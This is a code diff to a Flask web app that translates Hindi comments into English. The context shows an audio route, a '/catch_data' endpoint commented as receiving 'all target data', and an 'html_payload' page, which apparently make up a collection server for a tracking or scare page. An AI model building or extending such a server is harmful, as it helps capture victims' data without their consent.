@@ -3,12 +3,12 @@ import os
 
 app = Flask(__name__)
 
-# Local audio file serve karne ke liye
+# Used to serve local audio files
 @app.route('/scream.mp3')
 def send_audio():
     return send_from_directory(os.getcwd(), 'scream.mp3')
 
-# --- Yahan Target ka saara data receive hoga ---
+# --- All target data will be received here ---
 @app.route('/catch_data', methods=['POST'])
 def catch_data():
     target_info = request.json
@@ -178,5 +178,5 @@ def log_page():
     return render_template_string(html_payload)
 
 if __name__ == '__main__':
-    # Flask ko 8080 port par run karein
+    # Run the Flask application on port 8080
     app.run(host='0.0.0.0', port=8080)
